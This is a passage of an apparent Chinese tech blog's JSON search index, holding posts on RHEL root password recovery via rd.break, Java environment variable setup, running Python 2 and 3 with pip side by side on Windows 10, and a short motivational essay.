rd.lvm.lv=rhel/swap v\\console.font=latarcyrheb-sun16 vconsole.keymap=us rhgb quiet LANG=en_US.UTF-8\\ rd.break 编辑内核界面 修改密码输入下面这些命令 编辑如下命令 1234567switch_root:/# mount -o remount,rw /sysrootswitch_root:/# chroot /sysrootsh-4.2# passwd此处略过...sh-4.2# touch /.autorelabelsh-4.2# exitsh-4.2# reboot 基于debian版本基于slackware版本最后Linux衍生版本","tags":[{"name":"Linux","slug":"Linux","permalink":"http://www.deops.cn/tags/Linux/"},{"name":"RedHat","slug":"RedHat","permalink":"http://www.deops.cn/tags/RedHat/"}]},{"title":"Java环境变量配置","date":"2018-08-03T15:34:01.000Z","path":"/posts/295162d9/","text":"前言Java版本1.8.0_161我的安装目录C:\\Java\\ 环境变量配置添加环境变量JAVA_HOME C:\\Java\\jdk1.8.0_161 CLASSPATH .;%JAVA_HOME%\\lib\\dt.jar;%JAVA_HOME%\\lib\\tools.jar; 编辑path %JAVA_HOME%\\bin;%JAVA_HOME%\\jre\\bin; 测试一下变量配置是否正确 java and javac 12345public class test&#123; public static void main(String[] args)&#123; System.out.println(\"Hello World, hello java !\"); &#125;&#125; 保存为test.java编译源代码javac test.javajava test 最后最新版JavaJava8_se","tags":[{"name":"Java","slug":"Java","permalink":"http://www.deops.cn/tags/Java/"},{"name":"编程","slug":"编程","permalink":"http://www.deops.cn/tags/编程/"}]},{"title":"Win10环境下Python2、3和pip2、3版本共存","date":"2018-08-03T15:04:25.000Z","path":"/posts/e9c6771b/","text":"这里我使用Win10-x64的电脑来操作我的Python安装目录C:\\Python\\安装Python首先安装Python3C:\\Python\\Python35\\直接下一步下一步即可 然后安装Python2C:\\Python\\Python27\\安装Python2的时候把添加到环境变量的勾先去掉 修改系统环境变量编辑Path变量，添加Python2的环境变量这里我的目录是C:\\Python\\Python27\\和C:\\Python\\Python27\\Scripts\\ 将python.exe重命名了一个修改成python3.exe；一个修改成python2.exe即可 pip的设置 Python 安装包需要用到包管理工具pip，但是当同时安装python2和python3的时候，pip只是其中一个版本，以下将提供一个修改方式，即重新安装两个版本的pip，使得两个python版本的pip能够共存。运行如下命令即可python3 -m pip install --upgrade pip --force-reinstall python2 -m pip install --upgrade pip --force-reinstall","tags":[{"name":"编程","slug":"编程","permalink":"http://www.deops.cn/tags/编程/"},{"name":"Python2","slug":"Python2","permalink":"http://www.deops.cn/tags/Python2/"},{"name":"Python3","slug":"Python3","permalink":"http://www.deops.cn/tags/Python3/"},{"name":"Python-pip","slug":"Python-pip","permalink":"http://www.deops.cn/tags/Python-pip/"}]},{"title":"自由的灵魂必将远航","date":"2018-08-03T13:55:24.000Z","path":"/posts/9e3f6743/","text":"你背单词时，阿拉斯加的鳕鱼正跃出水面；你算数学时，太平洋彼岸的海鸥振翅掠过城市上空；你晚自习时，极圈上的夜空散漫了五彩斑斓；但是少年你别着急，在你为自己未来踏踏实实地努力时，那些你感觉从来不会看到的景色，那些你觉得终身不会遇到的人，正一步步向你走来。 我想象不到在这个星球发生的很多美好的景象，所以我才努力，因为世界那么大，我想去看看。 依然还是很喜欢这句话， 我还在努力，所以等等我 嘻嘻，原来这句话，不算鸡汤呀 img 学弟学妹也加油，我在距离清华5公里外的 北四环，等你 只是个沉默的大多数 多说了几句话。 这句话，好像我想在的生活状态 快节奏的生活 当你认真起来的样子真的有点可爱 doge | 300x300 books to be or not to be.that is the question.谨以此句献给在迷雾中砥砺前行的我们 后续…谢谢大家的赞这句话会有种莫名的情怀，有点小治愈。当然，努力不是自我感动最怕你一直忙忙碌碌到头来还在人海里浮沉。有趣的灵魂和努力的你都要在路上 来自知乎当代大学生有多努力？@薛定谔的 en","tags":[{"name":"学习","slug":"学习","permalink":"http://www.deops.cn/tags/学习/"},{"name":"生活","slug":"生活","permalink":"http://www.deops.cn/tags/生活/"},{"name":"努力","slug":"努力","permalink":"http://www.deops.cn/tags/努力/"}]}]